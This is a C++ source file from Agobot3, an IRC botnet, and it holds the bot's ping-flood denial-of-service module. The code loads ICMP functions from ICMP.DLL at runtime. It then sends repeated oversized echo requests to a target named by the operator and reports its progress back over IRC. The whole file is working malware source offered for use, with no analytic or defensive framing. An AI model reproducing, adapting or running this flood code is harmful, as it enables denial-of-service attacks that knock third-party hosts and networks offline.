/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. 
*/
#include "main.h"
#include "pingflood.h"
#include "mainctrl.h"
//#include "utility.h"


 typedef unsigned long IPAddr;

// REMOVED BY GHOSN
// STRUCTURES ASSIGNED IN Iphlpapi.lib
 /*typedef struct ip_option_information {
 	unsigned char Ttl;
 	unsigned char Tos;
 	unsigned char Flags;
 	unsigned char OptionsSize;
 	unsigned char FAR *OptionsData;
 } IP_OPTION_INFORMATION, *PIP_OPTION_INFORMATION;

 typedef struct icmp_echo_reply {
 	IPAddr Address;
 	unsigned long Status;
 	unsigned long RoundTripTime;
 	unsigned short DataSize;
 	unsigned short Reserved;
 	void FAR *Data;
 	struct ip_option_information Options;
 } ICMP_ECHO_REPLY;
*/
 typedef int (__stdcall *ICF)(VOID); ICF fIcmpCreateFile;
 typedef int (__stdcall *ISE)(HANDLE, IPAddr, LPVOID, WORD, PIP_OPTION_INFORMATION, LPVOID, DWORD, DWORD);
 ISE fIcmpSendEcho;  typedef int (__stdcall *ICH)(HANDLE);  ICH fIcmpCloseHandle;

long PingFlood(char *target, int times, int size, int delay);

CDDOSPingFlood::CDDOSPingFlood() { m_sDDOSName.Assign("ping"); }

void CDDOSPingFlood::StartDDOS()
{

	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: %s (%utimes/%ubytes/%dms)", m_sDDOSName.CStr(), m_sHost.CStr(), m_iNumber,m_iSize, m_iDelay);
	CString sReply; 
	if(PingFlood(m_sHost.Str(), m_iNumber,m_iSize, m_iDelay)){
		sReply.Format("[%s] Finished flooding %s %d Times", m_sDDOSName.CStr(), m_sHost.CStr(), m_iNumber);
	}else{
		sReply.Format("[%s] Cannot send pings - Doesn't have DLLs", m_sDDOSName.CStr());
	}
g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), sReply.CStr());
}

long SendPing(unsigned long TargetIP, int times, int size, int delay) {
bool noicmp;
	 	HINSTANCE icmp_dll = LoadLibrary("ICMP.DLL");
    if (icmp_dll == 0) noicmp = TRUE;
 	else {
	 	fIcmpCreateFile  = (ICF)GetProcAddress(icmp_dll,"IcmpCreateFile");
 		fIcmpCloseHandle = (ICH)GetProcAddress(icmp_dll,"IcmpCloseHandle");
 		fIcmpSendEcho    = (ISE)GetProcAddress(icmp_dll,"IcmpSendEcho");
 		if (!fIcmpCreateFile || !fIcmpCloseHandle || !fIcmpSendEcho) {
	        noicmp = TRUE;
	    }
	}
	if (noicmp) return 0;
	char pbuff[65500]; 
  	if (size > 65500) size = 65500;
	if (delay < 1) delay = 1;
	ICMP_ECHO_REPLY reply;
	HANDLE icmp; icmp = (HANDLE)fIcmpCreateFile();
	int i = 0; 
	while (i < times && g_cMainCtrl.m_cDDOS.m_bDDOSing) {
	fIcmpSendEcho(icmp, TargetIP, pbuff, size, NULL, &reply, sizeof(ICMP_ECHO_REPLY), delay);
	i++;
	}

	fIcmpCloseHandle(icmp);
	return 1;
}

long PingFlood(char *target, int times, int size, int delay)
{	unsigned long TargetIP; unsigned long SpoofIP;
	TargetIP=ResolveAddress(target);
	return SendPing(TargetIP, times, size, delay); }
